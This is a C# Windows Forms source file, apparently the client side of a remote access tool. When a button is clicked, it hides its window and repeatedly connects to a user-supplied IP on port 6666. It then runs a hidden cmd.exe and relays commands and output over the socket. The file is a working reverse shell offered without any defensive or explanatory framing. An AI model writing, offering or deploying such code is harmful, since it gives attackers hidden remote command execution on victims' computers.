// this is the clint side code 


using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Diagnostics;

namespace ret_7
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        string ipAddress;

        public object textBoxIP { get; private set; }

        public Form1()
        {
            InitializeComponent();
        }

        private void buttonConnect_Click(object sender, EventArgs e)
        {
            ipAddress = textBoxIP.Text.Trim();
            this.Hide();

            for (; ; )
            {
                RunServer();
                System.Threading.Thread.Sleep(5000);
            }
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect(ipAddress, 6666);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream) { AutoFlush = true };
                }
                catch { return; }

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");

                    if (strInput.ToString().Contains("terminate"))
                        StopServer();

                    if (strInput.ToString().Contains("exit"))
                        throw new ArgumentException();

                    processCmd.StandardInput.WriteLine(strInput.ToString());
                    strInput.Clear();
                }
                catch
                {
                    Cleanup();
                    break;
                }
            }
        }

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch { }
            try { streamReader.Close(); } catch { }
            try { streamWriter.Close(); } catch { }
            try { networkStream.Close(); } catch { }
        }

        private void StopServer()
        {
            Cleanup();
            Environment.Exit(Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                }
                catch { }
            }
        }
    }
}

